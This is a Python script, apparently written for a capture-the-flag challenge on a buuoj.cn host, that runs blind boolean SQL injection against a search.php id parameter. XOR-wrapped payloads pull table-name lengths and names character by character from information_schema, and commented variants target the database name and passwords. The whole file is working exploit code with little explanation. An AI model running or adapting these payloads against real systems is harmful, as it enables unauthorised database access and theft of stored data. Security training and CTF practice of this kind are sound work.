from urllib import parse

import requests
URL = "http://1ad0aa49-79f0-41af-8872-ab06108f194f.node3.buuoj.cn/search.php?id="

data = {"username":"admin\\","password":""}

def Length():
	i=1
	while True:
		i=i+1
		payload = "1^1^(SELECT(CONVERT((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema=database())),SIGNED))<{0})".format(i) #得到表长
		# payload = "1^1^(ascii(substr((select(database())),{0},1))<{1})".format(i, mid) #库长
		url = URL + parse.quote(payload)
		# r = requests.post(url,data=data)
		r = requests.get(url)
		print(url)
		if "Click" in r.text:
			print("数据库/数据表长："+str(i-1))
			break
		# elif "Error!" in r.text:
		# 	continue
		# else:
		# 	print("语法错误！")
		# 	break
def Name():
	result=""
	global URL
	for i in range(1,17):
		for mid in range(32,128):
			# payload = "1^1^(ascii(substr((select(database())),{0},1))<{1})".format(i, mid)
			payload = "1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{0},1))<{1})".format(i, mid)
			# payload = "or/**/if(ascii(substr(password,%d,1))>%d,1,0)#"%(i,mid)
			url = URL+parse.quote(payload)
			# r = requests.post(url,data=data)
			r = requests.get(url)
			# print(url)
			if "Click" in r.text:
				result+=chr(mid)
				break
		print(result)
if __name__ == '__main__':
	# Length() # 4 表16
	 Name() #
	# hffl 表G2obJ2z-Gmbbbbbh